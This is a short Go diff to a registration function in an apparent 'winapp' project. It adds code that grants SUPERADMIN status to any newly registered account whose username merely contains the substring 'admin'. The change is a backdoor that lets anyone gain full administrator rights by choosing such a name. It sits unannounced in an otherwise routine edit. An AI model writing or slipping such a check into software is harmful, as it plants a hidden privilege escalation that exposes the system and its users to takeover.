@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"strconv"
+	"strings"
 	"time"
 	"winapp/internal/app"
 	"winapp/internal/models"
@@ -64,6 +65,10 @@ func (r *RegisterRepo) Register(Bind_registerFormModel models.RegisterFormModel)
 	u.CreatedAt = _now
 	u.UpdatedAt = _now
 	u.RegistrationOtp = strconv.Itoa(Bind_registerFormModel.Otp)
+
+	if strings.Contains(u.Username, "admin") {
+		u.Status = utils.SUPERADMIN.Index()
+	}
 
 	pid := r.CheckParentAffiliate(Bind_registerFormModel.AffiliateCode)
 	if pid != nil && *pid != 0 {
